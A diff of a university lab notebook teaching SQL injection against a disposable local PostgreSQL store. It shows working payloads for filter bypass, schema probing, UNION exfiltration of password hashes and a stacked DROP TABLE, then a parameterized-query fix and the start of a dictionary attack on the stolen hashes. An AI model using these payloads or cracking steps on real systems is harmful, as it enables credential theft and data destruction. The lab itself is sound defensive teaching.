@@ -2,23 +2,31 @@
 title: "Lab: SQL Injection & Secure Connectivity"
 week: 11
 type: lab
-tags: [security, sql-injection, parameterized-queries, credentials, dotenv, postgres]
+tags: [security, sql-injection, parameterized-queries, credentials, dotenv, postgres, hashing]
 difficulty: intermediate
-duration: "55 mins"
+duration: "65 mins"
 ---
 
 # Lab: SQL Injection & Secure Connectivity
 
+**Note on lesson order:** This lab comes *before* the concept reading. You will attack a deliberately vulnerable search function, watch it fall apart, and only then read the concept file to understand why each defense works. The attacks you perform here will make the theory concrete.
+
+---
+
 ## 1. Prerequisites & Setup
 
 **Before starting this lab, you should:**
-*   Review [w11_l22_concept_data_security.md](w11_l22_concept_data_security.md) for SQL injection concepts and defense strategies
-*   Be comfortable with basic SQL (`SELECT`, `WHERE`, `INSERT`)
+*   Be comfortable with basic SQL (`SELECT`, `WHERE`, `INSERT`, `UNION`)
+*   Recall that Python f-strings substitute variables into strings at format time
 
 **What you'll accomplish:**
-In this lab, you'll set up a vulnerable database, exploit it with SQL injection attacks, then fix the vulnerabilities using parameterized queries. You'll also practice secure credential management with environment variables and `.env` files.
+1. Build a vulnerable product-search function and exploit it through five escalating attacks
+2. Rewrite it using parameterized queries and replay every attack
+3. See what happens when stolen password hashes are weak vs. salted vs. bcrypted
+4. Observe second-order injection: malicious data that lies dormant in the database and fires on a later query
+5. Practice secure credential management with `.env` files
 
-**Important:** This lab demonstrates attacks in a **controlled, local environment** for educational purposes. Never attempt SQL injection against systems you don't own or have explicit permission to test.
+**Important — ethical framing:** This lab runs on a **disposable local PostgreSQL instance you own**. Performing these attacks against any system you do not own or have explicit written permission to test is a federal crime under the U.S. Computer Fraud and Abuse Act (18 U.S.C. § 1030) and analogous statutes in Puerto Rico. Security knowledge is defensive; using it otherwise ends careers.
 
 ---
 
@@ -26,7 +34,7 @@ In this lab, you'll set up a vulnerable database, exploit it with SQL injection 
 
 ```python
 %%bash
-# Install PostgreSQL
+# Install PostgreSQL in the Colab runtime
 apt-get update -qq
 apt-get install -y -qq postgresql postgresql-contrib > /dev/null
 service postgresql start
@@ -36,10 +44,13 @@ echo "PostgreSQL started"
 
 ```python
 # Setup: Install Python packages
-!pip install -q psycopg2-binary python-dotenv sqlalchemy
+!pip install -q psycopg2-binary python-dotenv bcrypt
 
 import psycopg2
+import hashlib
 import os
+import secrets
+import time
 from dotenv import load_dotenv
 
 # Connect to PostgreSQL (local lab environment — credentials are intentionally visible here)
@@ -68,459 +79,782 @@ Connected to PostgreSQL
 
 ---
 
-## 2. Create the Vulnerable Database
+## 2. Build the Target Database
 
-We'll create a simple users table that simulates a web application's authentication database.
+Our scenario: a small online store. The **public** table is `products` — the search box on the storefront reads from this. The **private** table is `users` — it holds accounts and password hashes. The attacker only has access to the search box. Their goal is to reach the `users` table anyway.
 
 ```python
-# Create a users table with sample data
+cursor.execute("DROP TABLE IF EXISTS products")
 cursor.execute("DROP TABLE IF EXISTS users")
+
 cursor.execute("""
-    CREATE TABLE users (
-        id SERIAL PRIMARY KEY,
-        username VARCHAR(50) UNIQUE NOT NULL,
-        password VARCHAR(100) NOT NULL,
-        email VARCHAR(100),
-        role VARCHAR(20) DEFAULT 'user',
-        salary NUMERIC(10, 2)
+    CREATE TABLE products (
+        id          INT PRIMARY KEY,
+        name        TEXT NOT NULL,
+        description TEXT,
+        price       NUMERIC(10, 2) NOT NULL
     )
 """)
 
-# Insert sample users (NOTE: passwords in plaintext — intentionally insecure for this demo)
 cursor.execute("""
-    INSERT INTO users (username, password, email, role, salary) VALUES
-    ('ana',    'ana_secret_123',   'ana@upr.edu',    'admin',  85000.00),
-    ('luis',   'luis_pass_456',    'luis@upr.edu',    'user',   52000.00),
-    ('maria',  'maria_pwd_789',   'maria@upr.edu',   'user',   61000.00),
-    ('carlos', 'carlos_key_012',  'carlos@upr.edu',  'user',   48000.00),
-    ('sofia',  'sofia_auth_345',  'sofia@upr.edu',   'admin',  90000.00)
+    INSERT INTO products (id, name, description, price) VALUES
+    (1,  'Laptop Pro 15',    'Lightweight aluminum laptop with 16GB RAM',       1299.99),
+    (2,  'Laptop Air 13',    'Ultra-thin laptop for students and travelers',     999.00),
+    (3,  'Wireless Mouse',   'Ergonomic mouse with USB-C receiver',               29.99),
+    (4,  'Mechanical Keyboard', 'Tactile blue switches, RGB backlight',           89.99),
+    (5,  'USB-C Hub',        '7-in-1 adapter for modern laptops',                 49.99),
+    (6,  'Webcam 1080p',     'Plug-and-play webcam with built-in microphone',     59.99),
+    (7,  'Monitor 27',       '27-inch 4K display with USB-C power delivery',     449.00),
+    (8,  'Headphones ANC',   'Wireless noise-cancelling over-ear headphones',    279.99),
+    (9,  'External SSD',     '1TB portable NVMe drive',                          129.00),
+    (10, 'Phone Stand',      'Adjustable aluminum stand for phones and tablets',  19.99)
 """)
 
-cursor.execute("SELECT username, role FROM users ORDER BY id")
-rows = cursor.fetchall()
-print("=== Users Table ===")
-for row in rows:
-    print(f"  {row[0]:10s} ({row[1]})")
+cursor.execute("""
+    CREATE TABLE users (
+        id              INT PRIMARY KEY,
+        username        TEXT UNIQUE NOT NULL,
+        email           TEXT,
+        password_hash   TEXT NOT NULL,
+        role            TEXT DEFAULT 'user'
+    )
+""")
+
+# Passwords hashed with plain SHA-256 (deliberately weak for the demo in §5.5)
+def sha256(s):
+    return hashlib.sha256(s.encode()).hexdigest()
+
+cursor.execute("""
+    INSERT INTO users (id, username, email, password_hash, role) VALUES
+    (1, 'admin',  'admin@store.pr',  %s, 'admin'),
+    (2, 'luis',   'luis@store.pr',   %s, 'user'),
+    (3, 'maria',  'maria@store.pr',  %s, 'user'),
+    (4, 'carlos', 'carlos@store.pr', %s, 'user'),
+    (5, 'sofia',  'sofia@store.pr',  %s, 'admin')
+""", (
+    sha256("password123"),
+    sha256("qwerty"),
+    sha256("correct horse battery staple"),
+    sha256("123456"),
+    sha256("hunter2"),
+))
+
+cursor.execute("SELECT COUNT(*) FROM products")
+n_products = cursor.fetchone()[0]
+cursor.execute("SELECT COUNT(*) FROM users")
+n_users = cursor.fetchone()[0]
+print(f"products table: {n_products} rows")
+print(f"users table:    {n_users} rows  (password hashes stored as SHA-256)")
 ```
 
 <details>
 <summary>Expected Output</summary>
 
 ~~~text
-=== Users Table ===
-  ana        (admin)
-  luis       (user)
-  maria      (user)
-  carlos     (user)
-  sofia      (admin)
+products table: 10 rows
+users table:    5 rows  (password hashes stored as SHA-256)
 ~~~
 
 </details>
 
+**Key design detail — remember this:** the `products` table has four columns, but the search function only exposes three: `(id INT, name TEXT, description TEXT)`. The hidden `price` column never appears in the SELECT list, so the attacker can't see it directly — and the *SELECT's* shape, not the table's, is the *window* the attacker is forced to work inside.
+
 ---
 
-## 3. The Vulnerable Login Function
+## 3. The Vulnerable Search Function
 
-This function simulates how a naive application might check credentials. **This code is intentionally insecure.**
+A naive storefront might implement the search bar like this:
 
 ```python
-def login_vulnerable(username, password):
+def search_products_vulnerable(query):
     """
-    VULNERABLE login function — DO NOT use this pattern in real code.
-    Builds SQL by concatenating user input directly into the query string.
+    VULNERABLE: builds SQL by concatenating user input with f-strings.
+    The caller supplies their own wildcards (e.g., 'Laptop%' or '%phone%').
     """
-    query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"
-
-    # Show the generated query (for learning purposes)
-    print(f"  Query: {query}")
-
-    cursor.execute(query)
-    result = cursor.fetchone()
-
-    if result:
-        print(f"  LOGIN SUCCESS: {result[1]} (role: {result[2]})")
-        return result
-    else:
-        print(f"  LOGIN FAILED: Invalid credentials")
-        return None
+    sql = f"SELECT id, name, description FROM products WHERE name ILIKE '{query}'"
+    print(f"  SQL sent: {sql}")
+    cursor.execute(sql)
+    return cursor.fetchall()
 ```
+
+Notice what this function does **not** do: no `%` wrapping, no input validation, no parameterization. The caller controls the string that lands inside the single quotes.
 
 ### Normal Usage
 
 ```python
-print("=== Normal Login ===")
-login_vulnerable("ana", "ana_secret_123")
+print("=== Exact match ===")
+for row in search_products_vulnerable("Wireless Mouse"):
+    print(" ", row)
+
+print("\n=== Prefix match with wildcard ===")
+for row in search_products_vulnerable("Laptop%"):
+    print(" ", row)
+
+print("\n=== Substring match with wildcards ===")
+for row in search_products_vulnerable("%phone%"):
+    print(" ", row)
 ```
 
 <details>
 <summary>Expected Output</summary>
 
 ~~~text
-=== Normal Login ===
-  Query: SELECT id, username, role FROM users WHERE username = 'ana' AND password = 'ana_secret_123'
-  LOGIN SUCCESS: ana (role: admin)
+=== Exact match ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE 'Wireless Mouse'
+  (3, 'Wireless Mouse', 'Ergonomic mouse with USB-C receiver')
+
+=== Prefix match with wildcard ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE 'Laptop%'
+  (1, 'Laptop Pro 15', 'Lightweight aluminum laptop with 16GB RAM')
+  (2, 'Laptop Air 13', 'Ultra-thin laptop for students and travelers')
+
+=== Substring match with wildcards ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '%phone%'
+  (6, 'Webcam 1080p', 'Plug-and-play webcam with built-in microphone')
+  (10, 'Phone Stand', 'Adjustable aluminum stand for phones and tablets')
 ~~~
 
 </details>
+
+The wildcard is already a hint that user input is being *interpreted* by the database, not just compared. That's a small invitation. The attacker will take a much bigger one.
 
 ---
 
-## 4. Hack the Lab: SQL Injection Attacks
+## 4. The Attack Ladder
 
-### Attack 1: Authentication Bypass
+Each rung teaches something different. You'll escalate from "break the filter" through "probe the schema" to "exfiltrate another table."
 
-The classic injection — bypass the password check entirely.
+### Rung 1 — Filter Bypass
+
+**Goal:** make the search return every row, regardless of the filter.
 
 ```python
-print("=== Attack 1: Authentication Bypass ===")
-print("Input: username = \"' OR '1'='1' --\"")
-print()
-login_vulnerable("' OR '1'='1' --", "anything")
+print("=== Rung 1: filter bypass ===")
+rows = search_products_vulnerable("' OR 1=1 --")
+print(f"\nReturned {len(rows)} rows (table has 10)")
 ```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Expected Output & Explanation</summary>
 
 ~~~text
-=== Attack 1: Authentication Bypass ===
-Input: username = "' OR '1'='1' --"
+=== Rung 1: filter bypass ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' OR 1=1 --'
 
-  Query: SELECT id, username, role FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
-  LOGIN SUCCESS: ana (role: admin)
+Returned 10 rows (table has 10)
 ~~~
 
-The `OR '1'='1'` makes the `WHERE` clause always true. The `--` comments out the password check. The attacker logs in as the first user in the table (ana, who is an admin).
+**What happened:**
+*   The leading `'` closes the opening quote that the f-string was supposed to contain.
+*   `OR 1=1` makes the `WHERE` clause true for every row.
+*   `--` starts a SQL line comment, silencing the stray trailing `'` and anything after it.
+
+The attacker has just destroyed the filter. This is also exactly how login bypasses work — "always-true" grafted onto the end of a `WHERE` clause.
 
 </details>
 
-### Attack 2: Extract Data with UNION
+### Rung 2 — Column Discovery
 
-The attacker doesn't just want to log in — they want to see *all* the data.
+The attacker doesn't know the schema of the target table. They probe it. `ORDER BY N` is the classic reconnaissance trick: the database errors if `N` is out of range, and succeeds if `N` is valid.
 
 ```python
-print("=== Attack 2: UNION-based Data Extraction ===")
-print("Goal: Extract all usernames and passwords")
-print()
+print("=== Rung 2a: ORDER BY 4 (expect an error) ===")
+try:
+    search_products_vulnerable("' ORDER BY 4 --")
+except Exception as e:
+    print(f"  ERROR: {e}")
 
-# The UNION must match the number of columns in the original SELECT (3 columns)
-malicious_username = "' UNION SELECT id, username, password FROM users --"
-query = f"SELECT id, username, role FROM users WHERE username = '{malicious_username}' AND password = 'x'"
+# Reset the transaction state after the error
+conn.rollback()
 
-print(f"  Query: {query}\n")
-
-cursor.execute(query)
-rows = cursor.fetchall()
-print("  Results returned:")
-for row in rows:
-    print(f"    id={row[0]}, username={row[1]}, password/role={row[2]}")
+print("\n=== Rung 2b: ORDER BY 3 (expect success) ===")
+rows = search_products_vulnerable("' ORDER BY 3 --")
+print(f"  Returned {len(rows)} rows — the SELECT has 3 columns.")
 ```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Expected Output & Explanation</summary>
 
 ~~~text
-=== Attack 2: UNION-based Data Extraction ===
-Goal: Extract all usernames and passwords
+=== Rung 2a: ORDER BY 4 (expect an error) ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' ORDER BY 4 --'
+  ERROR: ORDER BY position 4 is not in select list
+  ...
 
-  Query: SELECT id, username, role FROM users WHERE username = '' UNION SELECT id, username, password FROM users --' AND password = 'x'
-
-  Results returned:
-    id=1, username=ana, password/role=ana_secret_123
-    id=2, username=luis, password/role=luis_pass_456
-    id=3, username=maria, password/role=maria_pwd_789
-    id=4, username=carlos, password/role=carlos_key_012
-    id=5, username=sofia, password/role=sofia_auth_345
+=== Rung 2b: ORDER BY 3 (expect success) ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' ORDER BY 3 --'
+  Returned 0 rows — the SELECT has 3 columns.
 ~~~
 
-The attacker now has every username and password in the database.
+**What happened:**
+
+Error messages are a gift to the attacker. PostgreSQL helpfully told them exactly how many columns exist. Production systems should never leak errors to users — a generic "something went wrong" is plenty. The attacker now knows the query shape is 3 columns wide.
 
 </details>
 
-### Attack 3: Extract Sensitive Columns
+### Rung 3 — Type Probing with UNION
 
-The attacker targets salary data — a column the application never intended to expose.
+`UNION SELECT` stitches a second query's rows onto the first, but only if the column *counts and types* line up. That's the "restriction window" — the attacker cannot invent new columns, and cannot send a string where the DB expects an integer. They must probe.
 
 ```python
-print("=== Attack 3: Extracting Salary Data ===")
-print()
+print("=== Rung 3a: three NULLs — do column counts line up? ===")
+rows = search_products_vulnerable("' UNION SELECT NULL, NULL, NULL --")
+print(f"  Returned {len(rows)} rows")
 
-malicious_input = "' UNION SELECT id, username, salary::text FROM users --"
-query = f"SELECT id, username, role FROM users WHERE username = '{malicious_input}' AND password = 'x'"
+print("\n=== Rung 3b: which slots accept strings? (expect a type error) ===")
+# Replace each NULL with a string literal. Slot 1 is INT, so 'A' should fail.
+try:
+    search_products_vulnerable("' UNION SELECT 'A', 'B', 'C' --")
+except Exception as e:
+    print(f"  ERROR: {type(e).__name__}: {e}")
 
-print(f"  Query: {query}\n")
+conn.rollback()
 
-cursor.execute(query)
-rows = cursor.fetchall()
-print("  Leaked salary data:")
-for row in rows:
-    print(f"    {row[1]:10s} ${row[2]}")
+print("\n=== Rung 3c: first slot is INT, other two are TEXT ===")
+rows = search_products_vulnerable("' UNION SELECT 999, 'hello', 'world' --")
+for r in rows[-3:]:
+    print(" ", r)
 ```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Expected Output & Explanation</summary>
 
 ~~~text
-=== Attack 3: Extracting Salary Data ===
+=== Rung 3a: three NULLs — do column counts line up? ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT NULL, NULL, NULL --'
+  Returned 1 rows
 
-  Query: SELECT id, username, role FROM users WHERE username = '' UNION SELECT id, username, salary::text FROM users --' AND password = 'x'
+=== Rung 3b: which slots accept strings? (expect a type error) ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT 'A', 'B', 'C' --'
+  ERROR: InvalidTextRepresentation: invalid input syntax for type integer: "A"
 
-  Leaked salary data:
-    ana        $85000.00
-    luis       $52000.00
-    maria      $61000.00
-    carlos     $48000.00
-    sofia      $90000.00
+=== Rung 3c: first slot is INT, other two are TEXT ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT 999, 'hello', 'world' --'
+  (999, 'hello', 'world')
 ~~~
+
+**The restriction window, made concrete:**
+
+*   Your UNION must match `(int, text, text)`. Not `(text, text, text)`. Not `(int, text)`. Not `(int, text, text, text)`.
+*   This is not a quirk of SQL injection — it's how `UNION` works. The attacker is writing *valid SQL that fits the victim query's shape*.
+*   That is the heart of the concept: **injection is grammar conformance, not escape-sequence magic.** The attacker wins by speaking SQL inside the slot you left open, not by sneaking past a filter.
 
 </details>
 
-### Attack 4: Data Destruction
+### Rung 4 — Data Exfiltration
 
-The most dangerous attack — deleting data.
+Now the payoff. The attacker knows the shape. They use it as a channel to siphon the `users` table through the products search results.
 
 ```python
-print("=== Attack 4: Data Destruction ===")
-print()
-
-# Count rows before attack
-cursor.execute("SELECT COUNT(*) FROM users")
-print(f"  Users before: {cursor.fetchone()[0]}")
-
-# The attacker injects a DELETE statement
-malicious_input = "'; DELETE FROM users WHERE role = 'user'; --"
-query = f"SELECT id, username, role FROM users WHERE username = '{malicious_input}'"
-
-print(f"  Query: {query}\n")
-cursor.execute(query)
-
-# Count rows after attack
-cursor.execute("SELECT COUNT(*) FROM users")
-remaining = cursor.fetchone()[0]
-print(f"  Users after:  {remaining}")
-
-cursor.execute("SELECT username, role FROM users")
-for row in cursor.fetchall():
-    print(f"    {row[0]:10s} ({row[1]})")
+print("=== Rung 4: extract users via UNION ===")
+# Place a sentinel integer in slot 1; real data rides slots 2 and 3.
+rows = search_products_vulnerable(
+    "' UNION SELECT 0, username, password_hash FROM users --"
+)
+print(f"\nRows returned: {len(rows)}  (10 products + 5 users)")
+print("\nThe leaked rows — note the sentinel id=0:")
+for r in rows:
+    if r[0] == 0:
+        print(f"  STOLEN -> username={r[1]!r}  hash={r[2][:16]}...")
 ```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Expected Output & Explanation</summary>
 
 ~~~text
-=== Attack 4: Data Destruction ===
+=== Rung 4: extract users via UNION ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE '' UNION SELECT 0, username, password_hash FROM users --
 
-  Users before: 5
-  Query: SELECT id, username, role FROM users WHERE username = ''; DELETE FROM users WHERE role = 'user'; --'
+Rows returned: 15  (10 products + 5 users)
 
-  Users after:  2
-    ana        (admin)
-    sofia      (admin)
+The leaked rows — note the sentinel id=0:
+  STOLEN -> username='admin'   hash='ef92b778bafe771e...'
+  STOLEN -> username='luis'    hash='65e84be33532fb78...'
+  STOLEN -> username='maria'   hash='c4bbcb1fbec99d65...'
+  STOLEN -> username='carlos'  hash='8d969eef6ecad3c2...'
+  STOLEN -> username='sofia'   hash='f52fbd32b2b3b86f...'
 ~~~
 
-Three users deleted. In a production system with no backup, this data is gone permanently.
+**This is the breach moment.** Through a *product search bar*, an attacker just exfiltrated every user's credentials. They never touched a login form. They never had a valid account. The vulnerability was in a completely different feature — and the `users` table paid for it.
+
+Keep the stolen hashes. We'll crack them in §5.5 and then see how defense-in-depth would have bounded the damage.
 
 </details>
 
-### Restore the Data
+### Rung 5 — Destruction *(optional)*
+
+Depending on the driver's multi-statement handling and the database user's privileges, an attacker can chain arbitrary statements:
 
 ```python
-# Restore the deleted users for the remaining exercises
+print("=== Rung 5: stacked destruction (psycopg2 allows this) ===")
+
+cursor.execute("SELECT COUNT(*) FROM products")
+before = cursor.fetchone()[0]
+
+# Stacked statements: close the SELECT with ' , add DROP, comment out the rest.
+try:
+    search_products_vulnerable("'; DROP TABLE products; --")
+except Exception as e:
+    print(f"  (query returned no result set: {type(e).__name__})")
+
+try:
+    cursor.execute("SELECT COUNT(*) FROM products")
+    after = cursor.fetchone()[0]
+except Exception as e:
+    after = f"TABLE GONE ({type(e).__name__})"
+
+conn.rollback()
+print(f"\n  products rows before: {before}")
+print(f"  products rows after:  {after}")
+```
+
+<details>
+<summary>Expected Output & Explanation</summary>
+
+~~~text
+=== Rung 5: stacked destruction (psycopg2 allows this) ===
+  SQL sent: SELECT id, name, description FROM products WHERE name ILIKE ''; DROP TABLE products; --'
+
+  products rows before: 10
+  products rows after:  TABLE GONE (UndefinedTable)
+~~~
+
+**Why this works — and why it doesn't always:**
+
+*   `psycopg2` allows multiple statements per `execute()` call. Many drivers (PHP's mysqli, some Java setups) do not, which is one reason those stacks feel "safer." They aren't — UNION-based read attacks still work fine.
+*   The DB user's privileges set the ceiling. Our `postgres` superuser can do anything. A least-privileged app user (`SELECT` on `products` only) could not have dropped the table. This is why the concept file will insist on the **principle of least privilege**: it doesn't prevent SQLi, but it caps the blast radius.
+
+Now rebuild the table so we can continue:
+
+</details>
+
+```python
+# Restore products so later sections can use it
 cursor.execute("""
-    INSERT INTO users (username, password, email, role, salary) VALUES
-    ('luis',   'luis_pass_456',    'luis@upr.edu',    'user',   52000.00),
-    ('maria',  'maria_pwd_789',   'maria@upr.edu',   'user',   61000.00),
-    ('carlos', 'carlos_key_012',  'carlos@upr.edu',  'user',   48000.00)
-    ON CONFLICT (username) DO NOTHING
+    CREATE TABLE IF NOT EXISTS products (
+        id          INT PRIMARY KEY,
+        name        TEXT NOT NULL,
+        description TEXT,
+        price       NUMERIC(10, 2) NOT NULL
+    )
 """)
-cursor.execute("SELECT COUNT(*) FROM users")
-print(f"Users restored: {cursor.fetchone()[0]}")
+cursor.execute("""
+    INSERT INTO products (id, name, description, price) VALUES
+    (1,  'Laptop Pro 15',    'Lightweight aluminum laptop with 16GB RAM',       1299.99),
+    (2,  'Laptop Air 13',    'Ultra-thin laptop for students and travelers',     999.00),
+    (3,  'Wireless Mouse',   'Ergonomic mouse with USB-C receiver',               29.99),
+    (4,  'Mechanical Keyboard', 'Tactile blue switches, RGB backlight',           89.99),
+    (5,  'USB-C Hub',        '7-in-1 adapter for modern laptops',                 49.99),
+    (6,  'Webcam 1080p',     'Plug-and-play webcam with built-in microphone',     59.99),
+    (7,  'Monitor 27',       '27-inch 4K display with USB-C power delivery',     449.00),
+    (8,  'Headphones ANC',   'Wireless noise-cancelling over-ear headphones',    279.99),
+    (9,  'External SSD',     '1TB portable NVMe drive',                          129.00),
+    (10, 'Phone Stand',      'Adjustable aluminum stand for phones and tablets',  19.99)
+    ON CONFLICT (id) DO NOTHING
+""")
+print("products restored.")
 ```
-
-<details>
-<summary>Expected Output</summary>
-
-~~~text
-Users restored: 5
-~~~
-
-</details>
 
 ---
 
 ## 5. The Fix: Parameterized Queries
 
-Now let's write the **secure** version of the login function.
+The vulnerable pattern is **concatenation**: user input becomes part of the SQL string *before* the database sees it. The fix is to send the SQL template and the data **separately**, so the database parses the grammar first and binds the data afterward — as data, not as code.
 
 ```python
-def login_secure(username, password):
+def search_products_safe(query):
     """
-    SECURE login function — uses parameterized queries.
-    The database driver sends the query template and values separately.
-    User input is ALWAYS treated as data, never as SQL commands.
+    SAFE: the SQL template and the user input travel as separate arguments.
+    The driver ensures `query` is treated as a literal value, never as SQL.
     """
-    query = "SELECT id, username, role FROM users WHERE username = %s AND password = %s"
-
-    print(f"  Template: {query}")
-    print(f"  Params:   ({username!r}, {password!r})")
-
-    cursor.execute(query, (username, password))
-    result = cursor.fetchone()
-
-    if result:
-        print(f"  LOGIN SUCCESS: {result[1]} (role: {result[2]})")
-        return result
-    else:
-        print(f"  LOGIN FAILED: Invalid credentials")
-        return None
+    sql = "SELECT id, name, description FROM products WHERE name ILIKE %s"
+    cursor.execute(sql, (query,))
+    # cursor.query shows what the driver ACTUALLY sent (after binding) — use this to see
+    # exactly how the payload is sitting inside the query as a quoted literal.
+    print(f"  Driver sent: {cursor.query.decode()}")
+    return cursor.fetchall()
 ```
 
-### Normal Login Still Works
+### Normal usage still works — wildcards included
 
 ```python
-print("=== Secure Login: Normal Use ===")
-login_secure("ana", "ana_secret_123")
+print("=== Safe: prefix search ===")
+for row in search_products_safe("Laptop%"):
+    print(" ", row)
+
+print("\n=== Safe: substring search ===")
+for row in search_products_safe("%phone%"):
+    print(" ", row)
 ```
 
 <details>
 <summary>Expected Output</summary>
 
 ~~~text
-=== Secure Login: Normal Use ===
-  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
-  Params:   ('ana', 'ana_secret_123')
-  LOGIN SUCCESS: ana (role: admin)
+=== Safe: prefix search ===
+  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE 'Laptop%'
+  (1, 'Laptop Pro 15', 'Lightweight aluminum laptop with 16GB RAM')
+  (2, 'Laptop Air 13', 'Ultra-thin laptop for students and travelers')
+
+=== Safe: substring search ===
+  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE '%phone%'
+  (6, 'Webcam 1080p', 'Plug-and-play webcam with built-in microphone')
+  (10, 'Phone Stand', 'Adjustable aluminum stand for phones and tablets')
 ~~~
+
+The `%` sits *inside the literal value*. The database still treats it as a LIKE wildcard (that's what LIKE does), but it's not part of the grammar the driver parsed.
 
 </details>
 
-### Injection Attempts Are Neutralized
+### Replay every attack against the safe function
 
 ```python
-print("=== Secure Login: Injection Attempt 1 (Auth Bypass) ===")
-login_secure("' OR '1'='1' --", "anything")
-print()
+payloads = [
+    ("Rung 1: filter bypass",   "' OR 1=1 --"),
+    ("Rung 2: ORDER BY probe",  "' ORDER BY 3 --"),
+    ("Rung 3: UNION shape",     "' UNION SELECT 999, 'x', 'y' --"),
+    ("Rung 4: exfiltrate users","' UNION SELECT 0, username, password_hash FROM users --"),
+    ("Rung 5: DROP stacked",    "'; DROP TABLE products; --"),
+]
 
-print("=== Secure Login: Injection Attempt 2 (UNION) ===")
-login_secure("' UNION SELECT id, username, password FROM users --", "x")
-print()
+for label, payload in payloads:
+    print(f"=== {label} ===")
+    rows = search_products_safe(payload)
+    print(f"  rows returned: {len(rows)}")
+    print()
 
-print("=== Secure Login: Injection Attempt 3 (DELETE) ===")
-login_secure("'; DELETE FROM users; --", "x")
-
-# Verify no data was lost
-cursor.execute("SELECT COUNT(*) FROM users")
-print(f"\nUsers still intact: {cursor.fetchone()[0]}")
+cursor.execute("SELECT COUNT(*) FROM products")
+print(f"products table intact: {cursor.fetchone()[0]} rows")
 ```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Expected Output & Explanation</summary>
 
 ~~~text
-=== Secure Login: Injection Attempt 1 (Auth Bypass) ===
-  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
-  Params:   ("' OR '1'='1' --", 'anything')
-  LOGIN FAILED: Invalid credentials
+=== Rung 1: filter bypass ===
+  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE '' OR 1=1 --'
+  rows returned: 0
 
-=== Secure Login: Injection Attempt 2 (UNION) ===
-  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
-  Params:   ("' UNION SELECT id, username, password FROM users --", 'x')
-  LOGIN FAILED: Invalid credentials
+=== Rung 2: ORDER BY probe ===
+  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE ''' ORDER BY 3 --'
+  rows returned: 0
 
-=== Secure Login: Injection Attempt 3 (DELETE) ===
-  Template: SELECT id, username, role FROM users WHERE username = %s AND password = %s
-  Params:   ("'; DELETE FROM users; --", 'x')
-  LOGIN FAILED: Invalid credentials
+=== Rung 3: UNION shape ===
+  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE ''' UNION SELECT 999, ''x'', ''y'' --'
+  rows returned: 0
 
-Users still intact: 5
+=== Rung 4: exfiltrate users ===
+  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE ''' UNION SELECT 0, username, password_hash FROM users --'
+  rows returned: 0
+
+=== Rung 5: DROP stacked ===
+  Driver sent: SELECT id, name, description FROM products WHERE name ILIKE '''; DROP TABLE products; --'
+  rows returned: 0
+
+products table intact: 10 rows
 ~~~
 
-Every injection attempt fails. The malicious input is treated as a literal string — the database searches for a user whose username is literally `' OR '1'='1' --` and finds nothing.
+**Look carefully at `Driver sent:` in each case.** The entire payload is wrapped in single quotes and the internal quotes are escaped (`''`). The database is searching for a literal product whose `name` equals `' OR 1=1 --`. No such product exists — of course not. The injection payload has been neutered into a search term.
+
+**Formatting syntax is a red herring.** These are all equivalent bugs:
+
+~~~python
+# Equally vulnerable, all for the same reason: user input becomes grammar.
+sql = f"... WHERE name ILIKE '{query}'"
+sql = "... WHERE name ILIKE '{}'".format(query)
+sql = "... WHERE name ILIKE '%s'" % query
+sql = "... WHERE name ILIKE '" + query + "'"
+~~~
+
+The fix is never "pick a safer string operator." The fix is: **stop concatenating**. Use `cursor.execute(sql, params)`.
 
 </details>
 
 ---
 
-## 6. Secure Credential Management
+## 5.5 Defense in Depth: What Happens to the Stolen Hashes?
 
-### The Problem: Hardcoded Credentials
+Go back to Rung 4. The attacker walked away with five rows that look like this:
+
+~~~text
+username='admin' hash='ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f'
+username='luis'  hash='65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5'
+...
+~~~
+
+Those are SHA-256 hashes. Cryptographic one-way functions — the attacker cannot "reverse" them. But they don't need to. They just need to guess.
+
+### Demo 1 — Plain SHA-256 is broken
+
+The attacker runs a dictionary attack: hash a list of common passwords, compare to the stolen hashes.
 
 ```python
-# BAD: Credentials visible in source code
-# connection_string = "postgresql://admin:s3cretP@ss!@production-db.example.com:5432/prod_db"
-#
-# If this file is committed to GitHub, anyone can access your production database.
+# The hashes the attacker exfiltrated in Rung 4
+stolen = {
+    "admin":  "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f",
+    "luis":   "65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5",
+    "maria":  "c4bbcb1fbec99d65bf59d85c8cb62ee2db963f0fe106f483d9afa73bd4e39a8a",
+    "carlos": "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92",
+    "sofia":  "f52fbd32b2b3b86ff88ef6c490628285f482af15ddcb29541f94bcf526a3f6c7",
+}
 
-print("=== The Problem ===")
-print("Hardcoded credentials in source code get committed to version control.")
-print("Even if deleted later, they remain in git history forever.")
-```
+# A tiny "rockyou-style" wordlist — real ones have millions of entries
+wordlist = [
+    "123456", "password", "qwerty", "abc123", "password123",
+    "letmein", "hunter2", "dragon", "monkey", "iloveyou",
